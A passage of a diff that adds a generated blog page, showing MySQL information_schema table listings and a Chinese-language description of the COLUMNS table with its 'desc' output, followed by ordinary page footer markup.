<span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>  <span class="number">55450570411999231</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="type">Time</span> zone names                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone_transition      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>   <span class="number">4785074604081151</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="type">Time</span> zone transitions                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone_transition_type <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>  <span class="number">10696049115004927</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="type">Time</span> zone transition types              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>                      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">5</span> <span class="operator">|</span>             <span class="number">70</span> <span class="operator">|</span>         <span class="number">352</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">55</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Users <span class="keyword">and</span> <span class="keyword">global</span> privileges             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+---------------------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-------------------+----------+--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="number">28</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>###COLUMNS表<br><code>information_schema.COLUMNS</code>表提供了表中的<code>列</code>的信息，详细表述了某张表的所有列以及每个列的信息，是<code>show columns from [schemaname].[tablename]</code>的结果。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> information_schema.COLUMNS;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field                    <span class="operator">|</span> Type                <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CATALOG            <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">512</span>)        <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_SCHEMA             <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_NAME               <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_NAME              <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ORDINAL_POSITION         <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="number">0</span>       <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_DEFAULT           <span class="operator">|</span> longtext            <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> IS_NULLABLE              <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">3</span>)          <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> DATA_TYPE                <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHARACTER_MAXIMUM_LENGTH <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHARACTER_OCTET_LENGTH   <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> NUMERIC_PRECISION        <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> NUMERIC_SCALE            <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> DATETIME_PRECISION       <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHARACTER_SET_NAME       <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLLATION_NAME           <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_TYPE              <span class="operator">|</span> longtext            <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_KEY               <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">3</span>)          <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> EXTRA                    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">30</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PRIVILEGES               <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">80</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_COMMENT           <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">1024</span>)       <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">20</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/sqli/MySQL%E4%B8%AD%E7%9A%84Information_schema%E4%BB%8B%E7%BB%8D.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m0nst3r</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
